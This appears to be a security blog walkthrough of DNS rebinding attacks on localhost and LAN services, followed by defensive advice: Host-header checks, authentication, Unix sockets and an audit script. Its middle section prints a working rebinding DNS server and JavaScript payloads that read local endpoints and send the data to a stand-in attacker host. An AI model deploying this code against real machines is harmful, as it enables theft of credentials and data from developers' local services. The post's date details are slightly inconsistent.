<!-- tags: security-research, networking, browser-security -->
<!-- date: 2025-06-22 -->
# Your Browser Is a Proxy: DNS Rebinding and the Localhost Backdoor You Didn't Know You Had

*A technical walkthrough of DNS rebinding attacks against local services, written for engineers who run things on localhost and assume that means they're safe. Spoiler: it doesn't.*

---

## The Thesis

If you're running a service on `localhost` — a dev server, a database admin panel, a Docker socket, a Kubernetes dashboard, a Jupyter notebook, a home automation controller — you probably assume the network boundary protects you. Nobody on the internet can reach `127.0.0.1`. That's true at the TCP layer. It's false at the application layer, because your browser will happily make the request for them.

DNS rebinding exploits the gap between how DNS resolution works and how browsers enforce the same-origin policy. The result: any webpage you visit can talk to any service on your local network, exfiltrate data from it, and in many cases execute commands — all without a single firewall rule being violated.

---

## The Security Model (And Where It Breaks)

Browsers enforce **same-origin policy (SOP)**: a page loaded from `https://evil.com` cannot read responses from `https://yourbank.com`. The origin is defined as `scheme + host + port`. The browser checks the origin of each request and blocks cross-origin reads (not sends — but we'll get to that).

Here's the assumption that breaks everything: **the browser determines "same origin" by comparing hostnames, not IP addresses.** If `evil.com` resolves to `1.2.3.4` and later resolves to `127.0.0.1`, the browser considers both responses as coming from the same origin — `evil.com`. The DNS resolution changed, but the hostname didn't.

That's the entire vulnerability. Everything else is just plumbing.

---

## How DNS Rebinding Works

### Step 1: The Setup

The attacker controls a domain (say, `rebind.attacker.com`) and its authoritative DNS server. They configure the DNS to respond with a very short TTL (like 0 seconds or 1 second) and initially return their own server's IP address.

```
Query:  rebind.attacker.com A?
Answer: 1.2.3.4  (attacker's server)  TTL=0
```

### Step 2: The Page Load

The victim visits `http://rebind.attacker.com/` in their browser. The browser resolves the DNS, connects to `1.2.3.4`, and loads the attacker's page. This page contains JavaScript that will execute the attack.

```html
<!-- Served from 1.2.3.4 (attacker's server) -->
<script>
  // Wait for DNS cache to expire, then fetch "same origin" —
  // but DNS now points to 127.0.0.1
  setTimeout(async () => {
    const res = await fetch('/api/secrets');
    const data = await res.text();
    // Exfiltrate to attacker
    navigator.sendBeacon('https://exfil.attacker.com/collect', data);
  }, 3000);
</script>
```

### Step 3: The Rebind

When the `setTimeout` fires and the browser makes the `fetch('/api/secrets')` request, it needs to resolve `rebind.attacker.com` again (because the TTL expired). This time, the attacker's DNS server responds differently:

```
Query:  rebind.attacker.com A?
Answer: 127.0.0.1  TTL=0
```

### Step 4: The Punchline

The browser connects to `127.0.0.1:80` and sends the request. From the browser's perspective, this is a same-origin request to `rebind.attacker.com`. From the local service's perspective, this is a connection from localhost. The response comes back. The browser allows the JavaScript to read it. The attacker's `sendBeacon` ships it out.

**No CORS violation. No firewall rule broken. No exploit code. Just DNS doing exactly what DNS does.**

---

## A Working DNS Rebinding Server

Here's a minimal authoritative DNS server that alternates between the attacker's IP and a target IP. This is the attacker-side infrastructure — roughly 60 lines of Python.

```python
"""
Minimal DNS rebinding server.
First query  → responds with ATTACKER_IP (serve the payload page)
Second query → responds with TARGET_IP  (pivot to local service)

Requires: pip install dnslib
Usage:    python3 rebind_dns.py
"""

from dnslib import DNSRecord, DNSHeader, RR, A, QTYPE
from dnslib.server import DNSServer, BaseResolver
import threading
import time

ATTACKER_IP = "1.2.3.4"      # your VPS
TARGET_IP   = "127.0.0.1"    # victim's localhost
DOMAIN      = "rebind.attacker.com."
TTL         = 0

class RebindResolver(BaseResolver):
    def __init__(self):
        self.query_count: dict[str, int] = {}
        self.lock = threading.Lock()

    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname)
        qtype = QTYPE[request.q.qtype]

        if qtype == "A" and qname.endswith(DOMAIN):
            with self.lock:
                count = self.query_count.get(qname, 0)
                self.query_count[qname] = count + 1

            # First query: serve attacker's page
            # Subsequent queries: rebind to target
            ip = ATTACKER_IP if count == 0 else TARGET_IP

            reply.add_answer(RR(
                rname=request.q.qname,
                rtype=QTYPE.A,
                rdata=A(ip),
                ttl=TTL,
            ))
            print(f"[DNS] {qname} → {ip} (query #{count + 1})")

        return reply


if __name__ == "__main__":
    resolver = RebindResolver()
    server = DNSServer(resolver, port=53, address="0.0.0.0")
    server.start_thread()
    print(f"[*] DNS rebinding server running on :53")
    print(f"[*] {DOMAIN} → first: {ATTACKER_IP}, then: {TARGET_IP}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        server.stop()
```

And the payload page served from the attacker's web server:

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
// Configurable target endpoint on the victim's localhost
const TARGET_PATH = '/api/config';
const EXFIL_URL   = 'https://exfil.attacker.com/collect';

async function attemptRebind() {
  for (let i = 0; i < 30; i++) {
    try {
      const res = await fetch(TARGET_PATH, { cache: 'no-store' });
      if (res.ok) {
        const body = await res.text();
        // Check if we got the target's response (not our own server's 404)
        if (body.includes('"database"') || body.includes('"secret"')) {
          navigator.sendBeacon(EXFIL_URL, JSON.stringify({
            source: location.hostname,
            path: TARGET_PATH,
            data: body,
          }));
          document.body.textContent = 'Done.';
          return;
        }
      }
    } catch (e) {
      // DNS hasn't rebound yet, or browser cached the old IP
    }
    await new Promise(r => setTimeout(r, 1000));
  }
  document.body.textContent = 'Timed out.';
}

attemptRebind();
</script>
</body>
</html>
```

That's it. Visit the page, wait three seconds, your Jupyter notebook's config (or your Webpack dev server's environment, or your Kubernetes dashboard token) is exfiltrated.

---

## What's Reachable

DNS rebinding doesn't just hit `127.0.0.1`. It hits **any IP the victim's machine can route to**. Common targets:

**Development servers.** React dev server (`localhost:3000`), Vite (`localhost:5173`), Webpack dev server (`localhost:8080`) — all typically have no authentication. Many expose environment variables, source maps, or full source code through debug endpoints. Webpack's dev server historically served `/__webpack_hmr` and the entire module graph.

**Database admin panels.** phpMyAdmin, Adminer, pgAdmin, Redis Commander, Mongo Express — tools that developers run on localhost because "it's only local." These often default to no-auth or trivial auth, and expose full database read/write.

**Docker socket.** If the Docker daemon's REST API is exposed on a TCP port (which tutorials frequently suggest), DNS rebinding gives you full Docker API access: list containers, pull images, exec into running containers, mount the host filesystem. `GET /containers/json` from a webpage. Think about that.

**Cloud metadata services.** AWS `169.254.169.254`, GCP `metadata.google.internal`, Azure `169.254.169.254`. On cloud VMs, the instance metadata endpoint provides IAM credentials, project IDs, and service account tokens. DNS rebinding from a browser on a cloud workstation can pivot to `169.254.169.254` and steal the instance's IAM role. (AWS IMDSv2 mitigates this with a PUT-based token flow that requires a custom header, but IMDSv1 is still the default in many environments.)

**IoT and home network devices.** Routers (`192.168.1.1`), NAS boxes, IP cameras, smart home hubs — devices that assume "if you can reach me on the LAN, you're authorized." Researchers have demonstrated DNS rebinding attacks against Google Home, Sonos speakers, Roku devices, and Samsung SmartThings hubs.

**Kubernetes dashboard.** The default `kubectl proxy` binds to `localhost:8001` with full cluster API access and no auth. A DNS rebinding attack against a developer running `kubectl proxy` gives the attacker `kubectl` level access to the cluster from a webpage.

---

## Why Browser Mitigations Don't Solve It

Browsers have tried to address DNS rebinding. The results are incomplete.

**DNS pinning.** Some browsers "pin" the IP address after the first resolution and don't re-resolve for the lifetime of the connection. Chrome implemented aggressive DNS pinning, and it does help — but it's not foolproof. The pin only applies to the socket pool for that specific connection. Opening a new connection (which the attacker can force by closing the previous one or using a different port) triggers a fresh DNS lookup.

**TTL floors.** Browsers typically enforce a minimum DNS cache TTL (Chrome uses 60 seconds). This slows the attack but doesn't prevent it — the attacker just waits 60 seconds. A webpage that keeps a tab open for a minute isn't suspicious.

**Private network access (PNA).** Chrome's [Private Network Access](https://wicg.github.io/private-network-access/) spec is the most promising mitigation. It adds a preflight check when a public-context page tries to access a private IP. The local service must respond with `Access-Control-Allow-Private-Network: true` or the request is blocked. As of 2026, PNA is enforced for `localhost` in Chrome but still in rollout for other private IPs, and other browsers haven't fully adopted it.

**The coverage gap.** Firefox and Safari have different (weaker) DNS rebinding mitigations. Any mitigation that isn't universal across all browsers isn't a mitigation — it's a suggestion. And PNA requires cooperation from the local service (it must respond to the preflight), which means every unmodified local service is still vulnerable.

---

## The Deeper Problem

DNS rebinding works because of a **mismatch in trust boundaries**:

1. **The network layer** says: "localhost is trusted, the internet is untrusted."
2. **The browser** says: "same hostname = same origin, regardless of IP."
3. **Local services** say: "if the connection comes from 127.0.0.1, it's local, so it's trusted."

These three assumptions are individually reasonable and collectively disastrous. The browser acts as an unwitting proxy, bridging the "untrusted internet" to the "trusted local network" while every component thinks its security model is intact.

This is the same class of mistake as the resume screening problem — **a trust model that works in isolation but falls apart at the seams.** DNS was designed for name resolution, not access control. Browsers enforce same-origin by hostname because that's what the spec says. Local services trust localhost because that's the convention. None of these are wrong independently. The vulnerability is emergent.

---

## What Actually Works

If you run services on localhost, here's what actually protects you — and what doesn't.

### Effective

**Bind to a Unix socket, not TCP.** If your service doesn't listen on a TCP port, DNS rebinding can't reach it. Docker can be configured to only use its Unix socket (`/var/run/docker.sock`). Databases can bind to Unix sockets. This is the strongest mitigation because it removes the attack surface entirely.

**Require authentication on everything.** Even on localhost. If your dev server requires a token, DNS rebinding can get a connection but not a valid session. Yes, this is annoying. Yes, it's the right answer.

**Validate the `Host` header.** DNS rebinding requests arrive with `Host: rebind.attacker.com`, not `Host: localhost`. A service that rejects requests where the `Host` header doesn't match its expected hostname blocks rebinding attacks trivially. Django does this by default (`ALLOWED_HOSTS`). Express does not.

```javascript
// Express middleware to block DNS rebinding
function hostCheck(allowedHosts) {
  const allowed = new Set(
    allowedHosts.map(h => h.toLowerCase())
  );
  return (req, res, next) => {
    const host = (req.headers.host || '').split(':')[0].toLowerCase();
    if (!allowed.has(host)) {
      res.status(403).json({
        error: 'Invalid Host header',
        received: req.headers.host,
      });
      return;
    }
    next();
  };
}

app.use(hostCheck(['localhost', '127.0.0.1']));
```

**Use HTTPS with real certificates, even locally.** If your local service uses HTTPS with a certificate for `localhost`, a DNS rebinding request from `rebind.attacker.com` will fail TLS certificate validation because the cert's CN/SAN won't match. Tools like `mkcert` make this trivial.

### Ineffective

**Firewall rules.** DNS rebinding bypasses the firewall entirely — the connection originates from the victim's own browser, on the victim's own machine. Every firewall in the world says "allow outbound connections from local processes." That's the connection the attacker uses.

**CORS headers.** Same-origin, so CORS doesn't apply. The browser thinks the request is going to `rebind.attacker.com`, and the response comes from `rebind.attacker.com` (which happens to be 127.0.0.1). No cross-origin, no CORS check.

**"It's just for development."** The development environment is where you're most likely to be browsing the web while running unauthenticated services on localhost. "Just for development" is exactly the threat model where this works.

---

## The Audit

Run this on any machine you develop on:

```bash
#!/usr/bin/env bash
# List TCP services listening on localhost that an attacker
# could reach via DNS rebinding
echo "=== Services reachable via DNS rebinding ==="
echo ""

# Linux
if command -v ss &>/dev/null; then
  ss -tlnp 2>/dev/null | awk 'NR>1 && ($4 ~ /^127\./ || $4 ~ /^\[::1\]/ || $4 ~ /^0\.0\.0\.0/ || $4 ~ /^\[::\]/) {
    split($4, a, ":"); port=a[length(a)]
    gsub(/.*users:\(\("/, "", $6); gsub(/".*/, "", $6)
    printf "  %-6s  %s\n", port, $6
  }'
# macOS
elif command -v lsof &>/dev/null; then
  lsof -iTCP -sTCP:LISTEN -P -n 2>/dev/null | awk 'NR>1 {
    split($9, a, ":"); port=a[length(a)]
    printf "  %-6s  %s\n", port, $1
  }' | sort -u
fi

echo ""
echo "Each of these is reachable from any webpage you visit."
echo "Services on 0.0.0.0 or [::] are exposed on ALL interfaces."
```

On a typical developer workstation, you'll find 5-15 listening services. Most have no authentication. All are reachable via DNS rebinding.

---

## Conclusion

DNS rebinding has been known since 2007. It's been [presented at every major security conference](https://crypto.stanford.edu/dns/). Browser vendors have shipped partial mitigations for a decade. And it still works, because the fundamental architecture — browsers trusting DNS for origin isolation, local services trusting the network boundary for access control — hasn't changed.

The right mental model isn't "localhost is safe." It's **"localhost is one DNS lookup away from the internet."** Every service you run without authentication, every dev server you start with `--host 0.0.0.0`, every dashboard you leave running on port 8080 because "nobody can reach it" — these are all one browser tab away from being someone else's API.

The fix isn't complicated. Validate Host headers. Require auth. Bind to Unix sockets when you can. Use HTTPS locally. These aren't hard problems — they're just problems nobody bothers with because the threat model feels theoretical.

It's not theoretical. It's `setTimeout` and 60 lines of Python.

---

*Last updated: June 2025*

## References

- [Stanford: DNS Rebinding Attacks](https://crypto.stanford.edu/dns/)
- [W3C: Private Network Access Specification](https://wicg.github.io/private-network-access/)
- [Chrome: Private Network Access Preflight](https://developer.chrome.com/blog/private-network-access-preflight/)
- [Tavis Ormandy: Attacking Local Services via DNS Rebinding](https://lock.cmpxchg8b.com/rebinding.html)
- [Craig Young: DNS Rebinding against Home Routers](https://www.tripwire.com/state-of-security/dns-rebinding-threats-home-networks)
- [Brannon Dorsey: DNS Rebinding Attacks Against IoT Devices](https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325)
- [AWS: IMDSv2 and Instance Metadata Security](https://docs.aws.amazon.com/ENGL/latest/UserGuide/configuring-instance-metadata-service.html)
- [Django: ALLOWED_HOSTS Setting](https://docs.djangoproject.com/en/5.0/ref/settings/#allowed-hosts)
- [mkcert: Locally Trusted Development Certificates](https://github.com/FiloSottile/mkcert)
